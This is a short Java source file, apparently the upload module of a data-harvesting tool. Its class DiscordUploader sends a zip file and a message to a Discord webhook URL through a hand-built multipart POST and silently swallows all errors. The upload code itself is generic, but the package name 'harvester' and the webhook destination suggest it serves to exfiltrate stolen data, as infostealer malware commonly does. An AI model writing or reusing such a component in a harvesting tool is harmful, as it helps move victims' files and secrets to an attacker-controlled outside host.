package com.example.harvester;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class DiscordUploader {
    public static boolean sendDocument(File file, String webhookUrl, String content) {
        try {
            String boundary = "----D" + System.currentTimeMillis();
            URL url = new URL(webhookUrl);
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(60000);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream os = c.getOutputStream();

            os.write(("--" + boundary + "\r\n").getBytes());
            os.write("Content-Disposition: form-data; name=\"content\"\r\n\r\n".getBytes());
            os.write(content.getBytes());
            os.write("\r\n".getBytes());

            os.write(("--" + boundary + "\r\n").getBytes());
            os.write(("Content-Disposition: form-data; name=\"file\"; filename=\""
                    + file.getName() + "\"\r\n").getBytes());
            os.write("Content-Type: application/zip\r\n\r\n".getBytes());

            FileInputStream in = new FileInputStream(file);
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) os.write(buf, 0, n);
            in.close();

            os.write(("\r\n--" + boundary + "--\r\n").getBytes());
            os.flush(); os.close();

            int code = c.getResponseCode();
            c.disconnect();
            return code >= 200 && code < 300;
        } catch (Exception e) {
            return false;
        }
    }
}
